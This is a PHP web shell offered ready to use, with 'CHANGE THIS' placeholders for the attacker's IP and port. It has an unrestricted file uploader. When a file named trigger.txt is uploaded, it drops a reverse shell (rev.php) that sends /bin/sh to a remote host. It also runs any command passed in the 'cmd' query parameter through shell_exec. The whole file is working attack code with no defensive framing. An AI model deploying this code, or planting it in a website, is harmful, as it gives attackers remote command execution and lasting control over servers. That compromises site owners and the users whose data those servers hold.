<?php
// ======= FILE UPLOADER =======
if (isset($_FILES['f'])) {
    $target = basename($_FILES['f']['name']);
    if (move_uploaded_file($_FILES['f']['tmp_name'], $target)) {
        echo "<b>Uploaded:</b> $target<br>";

        // Optional: Drop a reverse shell if uploaded file is a trigger (e.g., trigger.txt)
        if ($target === "trigger.txt") {
            $ip = 'YOUR_IP';      // 🛠️ CHANGE THIS
            $port = '4444';       // 🛠️ CHANGE THIS

            $shell = "<?php
            set_time_limit (0);
            \$sock=fsockopen('$ip',$port);
            \$proc=proc_open('/bin/sh', array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);
            ?>";

            file_put_contents("rev.php", $shell);
            echo "<b>Dropped reverse shell as rev.php</b><br>";
        }
    } else {
        echo "<b>Upload failed.</b><br>";
    }
}

// ======= FILE UPLOAD FORM =======
echo '<form method="POST" enctype="multipart/form-data">
    <input type="file" name="f">
    <input type="submit" value="Upload">
</form>';

// ======= COMMAND EXEC (Basic Shell) =======
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
